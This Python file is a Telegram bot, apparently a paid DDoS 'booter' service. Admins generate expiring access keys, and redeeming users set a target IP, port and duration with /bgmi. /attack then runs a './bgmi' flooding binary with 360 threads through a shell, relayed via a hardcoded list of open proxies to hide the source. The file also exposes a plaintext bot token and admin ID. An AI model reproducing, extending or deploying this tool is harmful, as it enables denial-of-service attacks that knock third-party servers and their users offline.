import subprocess
import json
import os
import random
import string
import datetime
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
import requests
import threading
import psutil

# Insert your Telegram bot token here
BOT_TOKEN = '7476031763:AAFqEHR-I6A4Anp4TaPxbbzs4fqynBRjHDE'

# Admin user IDs
ADMIN_IDS = {"881808734"}

# Files for data storage
USER_FILE = "users.json"
KEY_FILE = "keys.json"

# Global variable to store the process
flooding_process = None
flooding_command = None

# Default threads count
DEFAULT_THREADS = 360

# In-memory storage
users = {}
keys = {}
proxies_list = []

# Load users and keys from files initially
def load_data():
    global users, keys
    users = load_users()
    keys = load_keys()

def load_users():
    try:
        with open(USER_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}
    except Exception as e:
        print(f"Error loading users: {e}")
        return {}

def save_users():
    with open(USER_FILE, "w") as file:
        json.dump(users, file)

def load_keys():
    try:
        with open(KEY_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}
    except Exception as e:
        print(f"Error loading keys: {e}")
        return {}

def save_keys():
    with open(KEY_FILE, "w") as file:
        json.dump(keys, file)

def generate_key(length=6):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

def add_time_to_current_date(hours=0, days=0):
    return (datetime.datetime.now() + datetime.timedelta(hours=hours, days=days)).strftime('%Y-%m-%d %H:%M:%S')

# Mock refresh_proxies function
def refresh_proxies():
    global proxies_list
    proxies_list = ["20.235.159.154:80",
                    "177.234.241.25:999",
                    "18.169.83.87:1080",
                    "164.163.42.5:10000",
                    "161.34.40.109:3128",
                    "178.48.68.61:18080",
                    "34.140.150.176:3128",
                    "54.212.22.168:1080",
                    "85.209.153.174:8080",
                    "35.161.172.205:3128",
                    "85.209.153.175:4153",
                    "152.26.229.42:9443",
                    "200.24.131.126:999",
                    "20.44.188.17:3129",
                    "45.22.209.157:8888",
                    "177.234.241.32:999"
                    "152.26.231.22:9443",
"51.158.169.52:29976",
"152.26.229.42:9443",
"152.26.231.22:9443",
"5.189.130.42:23055",
"51.158.169.52:29976",
"152.26.229.88:9443",
"91.195.37.26:8080",
"152.26.229.88:9443",
"174.138.184.82:33229",
"47.252.18.37:3128",
"152.26.229.52:9443",
"204.137.238.6:3129",]
    print("Proxies refreshed")

def schedule_proxy_refresh(interval=3600):
    threading.Timer(interval, schedule_proxy_refresh, [interval]).start()
    refresh_proxies()

# Start the proxy refresh scheduler
schedule_proxy_refresh()

def get_working_proxy():
    random.shuffle(proxies_list)  # Shuffle to try random proxies
    for proxy in proxies_list:
        print(f"Checking proxy: {proxy}")  # Debug print
        ip, port = proxy.split(':')
        if check_proxy(ip, port):
            print(f"Working proxy found: {proxy}")  # Debug print
            return {"ip": ip, "port": port}
    print("No working proxy found")  # Debug print
    return None

def check_proxy(ip, port):
    try:
        response = requests.get("https://httpbin.org/ip", proxies={"http": f"http://{ip}:{port}", "https": f"http://{ip}:{port}"}, timeout=5)
        return response.status_code == 200
    except requests.RequestException as e:
        print(f"Proxy {ip}:{port} failed: {e}")  # Debug print
        return False

# Command to generate keys
async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    if user_id in ADMIN_IDS:
        command = context.args
        if len(command) == 2:
            try:
                time_amount = int(command[0])
                time_unit = command[1].lower()
                if time_unit == 'hours':
                    expiration_date = add_time_to_current_date(hours=time_amount)
                elif time_unit == 'days':
                    expiration_date = add_time_to_current_date(days=time_amount)
                else:
                    raise ValueError("Invalid time unit")
                key = generate_key()
                keys[key] = expiration_date
                save_keys()
                response = f"Key generated: {key}\nExpires on: {expiration_date}"
            except ValueError:
                response = "Please specify a valid number and unit of time (hours/days)."
        else:
            response = "Usage: /genkey <amount> <hours/days>"
    else:
        response = "🫅ONLY OWNER CAN USE🫅"

    await update.message.reply_text(response)

# Command to redeem keys
async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    command = context.args
    if len(command) == 1:
        key = command[0]
        if key in keys:
            expiration_date = keys[key]
            if user_id in users:
                user_expiration = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
                new_expiration_date = max(user_expiration, datetime.datetime.now()) + datetime.timedelta(hours=1)
                users[user_id] = new_expiration_date.strftime('%Y-%m-%d %H:%M:%S')
            else:
                users[user_id] = expiration_date
            save_users()
            del keys[key]
            save_keys()
            response = f"✅Key redeemed successfully! Access granted until: {users[user_id]}"
        else:
            response = "Invalid or expired key."
    else:
        response = "Usage: /redeem <key>"

    await update.message.reply_text(response)

# Command to show all users (admin only)
async def allusers(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    if user_id in ADMIN_IDS:
        if users:
            response = "Authorized Users:\n"
            for user_id, expiration_date in users.items():
                try:
                    user_info = await context.bot.get_chat(int(user_id))
                    username = user_info.username if user_info.username else f"UserID: {user_id}"
                    response += f"- @{username} (ID: {user_id}) expires on {expiration_date}\n"
                except Exception:
                    response += f"- User ID: {user_id} expires on {expiration_date}\n"
        else:
            response = "No data found"
    else:
        response = "ONLY OWNER CAN USE."
    await update.message.reply_text(response)

# Command to set flooding parameters
async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global flooding_command
    user_id = str(update.message.from_user.id)

    if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
        await update.message.reply_text("❌ Access expired or unauthorized. Please redeem a valid key.")
        return

    if len(context.args) != 3:
        await update.message.reply_text('Usage: /bgmi <target_ip> <port> <duration>')
        return

    target_ip = context.args[0]
    port = context.args[1]
    duration = context.args[2]

    proxy = get_working_proxy()
    if proxy is None:
        await update.message.reply_text('No working proxy found.')
        return

    proxy_command = f"http_proxy=http://{proxy['ip']}:{proxy['port']} https_proxy=http://{proxy['ip']}:{proxy['port']} "
    flooding_command = proxy_command + f"./bgmi {target_ip} {port} {duration} {DEFAULT_THREADS}"
    await update.message.reply_text(f'Flooding parameters set: {target_ip}:{port} for {duration} seconds with {DEFAULT_THREADS} threads.')

# Command to start flooding (renamed to attack)
async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global flooding_process, flooding_command
    user_id = str(update.message.from_user.id)

    if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
        await update.message.reply_text("❌ Access expired or unauthorized. Please redeem a valid key.")
        return

    if flooding_process is not None:
        await update.message.reply_text('Flooding is already running.')
        return

    if flooding_command is None:
        await update.message.reply_text('No flooding parameters set. Use /bgmi to set parameters.')
        return

    print(f"Starting flooding with command: {flooding_command}")  # Logging command
    flooding_process = subprocess.Popen(flooding_command, shell=True)
    print(f"Flooding process started with PID: {flooding_process.pid}")  # Logging PID

    duration = int(flooding_command.split()[4])
    threading.Timer(duration, notify_attack_end, [context, user_id]).start()
    await update.message.reply_text('Started flooding.')

# Command to stop flooding
async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global flooding_process
    user_id = str(update.message.from_user.id)

    if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
        await update.message.reply_text("❌ Access expired or unauthorized. Please redeem a valid key.")
        return

    if flooding_process is None:
        await update.message.reply_text('No flooding process is running.')
        return

    print(f"Stopping flooding process with PID: {flooding_process.pid}")  # Logging process termination

    # Terminate the process and all its child processes
    parent = psutil.Process(flooding_process.pid)
    for child in parent.children(recursive=True):  # Terminate child processes
        print(f"Terminating child process with PID: {child.pid}")
        child.terminate()
    _, still_alive = psutil.wait_procs(parent.children(), timeout=5)
    for p in still_alive:  # Force kill if still alive
        print(f"Force killing child process with PID: {p.pid}")
        p.kill()

    flooding_process.terminate()
    try:
        flooding_process.wait(timeout=5)
        print(f"Flooding process with PID {flooding_process.pid} terminated.")  # Added logging for termination
        flooding_process = None
        await update.message.reply_text('Stopped flooding.')
    except subprocess.TimeoutExpired:
        print(f"Flooding process with PID {flooding_process.pid} did not terminate within the timeout period.")
        flooding_process.kill()  # Force kill if terminate did not work
        flooding_process = None
        await update.message.reply_text('Stopped flooding with force.')

# Notify user when attack finishes
async def notify_attack_end(context: ContextTypes.DEFAULT_TYPE, user_id: str):
    await context.bot.send_message(chat_id=int(user_id), text="Attack finished.")

# Command to broadcast message to all users (admin only)
async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    if user_id in ADMIN_IDS:
        message = ' '.join(context.args)
        if not message:
            await update.message.reply_text('Usage: /broadcast <message>')
            return

        for user in users.keys():
            try:
                await context.bot.send_message(chat_id=int(user), text=message)
            except Exception as e:
                print(f"Error sending message to {user}: {e}")
        response = "Message sent to all users."
    else:
        response = "ONLY OWNER CAN USE."
    
    await update.message.reply_text(response)

# Command to add a user manually (admin only)
async def adduser(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    if user_id in ADMIN_IDS:
        try:
            target_user_id = context.args[0]
            expiration_date = add_time_to_current_date(days=30)  # Default 30 days
            users[target_user_id] = expiration_date
            save_users()
            response = f"User {target_user_id} added with access until {expiration_date}."
        except IndexError:
            response = "Usage: /adduser <user_id>"
    else:
        response = "ONLY OWNER CAN USE."
    
    await update.message.reply_text(response)

# Command to remove a user manually (admin only)
async def removeuser(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    if user_id in ADMIN_IDS:
        try:
            target_user_id = context.args[0]
            if target_user_id in users:
                del users[target_user_id]
                save_users()
                response = f"User {target_user_id} removed."
            else:
                response = "User not found."
        except IndexError:
            response = "Usage: /removeuser <user_id>"
    else:
        response = "ONLY OWNER CAN USE."
    
    await update.message.reply_text(response)

# Command to welcome users on their first visit
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    if user_id not in users:
        response = "Welcome! Use /redeem to gain access by redeeming a key."
    else:
        response = "Welcome back! Use /help to see available commands."
    await update.message.reply_text(response)

# Command to provide help information
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    response = (
        "Welcome to the Flooding Bot! Here are the available commands:\n\n"
        "Admin Commands:\n"
        "/genkey <amount> <hours/days> - Generate a key with a specified validity period.\n"
        "/allusers - Show all authorized users.\n"
        "/broadcast <message> - Broadcast a message to all authorized users.\n"
        "/adduser <user_id> - Add a user manually with default 30 days access.\n"
        "/removeuser <user_id> - Remove a user manually.\n\n"
        "User Commands:\n"
        "/redeem <key> - Redeem a key to gain access.\n"
        "/bgmi <target_ip> <port> <duration> - Set the flooding parameters.\n"
        "/attack - Start the flooding process.\n"
        "/stop - Stop the flooding process.\n"
    )
    await update.message.reply_text(response)

def main() -> None:
    application = ApplicationBuilder().token(BOT_TOKEN).build()

    application.add_handler(CommandHandler("genkey", genkey))
    application.add_handler(CommandHandler("redeem", redeem))
    application.add_handler(CommandHandler("allusers", allusers))
    application.add_handler(CommandHandler("bgmi", bgmi))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("stop", stop))
    application.add_handler(CommandHandler("broadcast", broadcast))
    application.add_handler(CommandHandler("adduser", adduser))
    application.add_handler(CommandHandler("removeuser", removeuser))
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))

    load_data()
    application.run_polling()

if __name__ == '__main__':
    main()
